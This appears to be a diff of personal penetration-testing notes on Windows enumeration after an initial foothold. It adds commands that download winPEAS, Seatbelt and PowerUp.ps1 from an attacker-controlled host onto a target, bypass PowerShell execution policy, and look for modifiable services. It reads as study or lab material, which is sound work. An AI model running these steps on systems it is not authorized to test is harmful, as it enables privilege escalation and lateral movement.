@@ -1,5 +1,7 @@
-## Windows Enumeration
+# Windows Enumeration
 Having gained a foothold on a Windows machine by whatever mechanism the following items are important steps for us to gain situational awareness, with each item potentially proving critical to a successful effort at privilege escalation or lateral movement:
+
+## Automatic Enumeration
 
 ### winPEAS
 Below is a lengthy list of commands that you can make use of in the event that `winPEAS` & `seatbelt` are impossible to smuggle onto the machine or are blocked via AV somehow. But under most circumstances lets not be cringe and use the purpose-built tool to enumerate a Windows environment:
@@ -14,7 +16,7 @@ On the target machine:
 iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
 .\winPEAS.exe
 ```
-
+### Seatbelt
 For `Seatbelt` search for `compiled seatbelt github download`, and grab the `Seatbelt.exe` file.
 Transfer to target in the usual fashion:
 ```bash
@@ -25,8 +27,22 @@ And run on the target:
 iwr -uri http://192.168.118.2/Seatbelt.exe -Outfile Seatbelt.exe
 .\Seatbelt.exe -group=all
 ```
+### PowerUp.ps1
+Nb. This tool (like most) should not be trusted implicitly always and if it offers no/insufficient usable information then manual techniques should be employed.
+```bash
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+python3 -m http.server 80
+```
+```powershell
+iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+```
 
 Look upon our exploitable shit ye mighty and despair!
+
+## Manual Enumeration
 
 ### Username and hostname
 ```cmd
@@ -35,6 +51,10 @@ whoami
 ### Group memberships of the current user
 ```cmd
 whoami /groups
+```
+### Our current privilege
+```cmd
+whoami /priv
 ```
 ### Existing users and groups
 ```powershell
@@ -131,7 +151,7 @@ Enumerate which users/groups have what privileges on a binary (nb. beneficial to
 ```powershell
 icacls "C:\path\to\interesting.exe"
 ```
-Mask to permissions mapping:
+Mask to permissions mapping (nb. A preceding 'I' indicates the access right is inherited):
 
 - F 	Full access
 - M 	Modify access
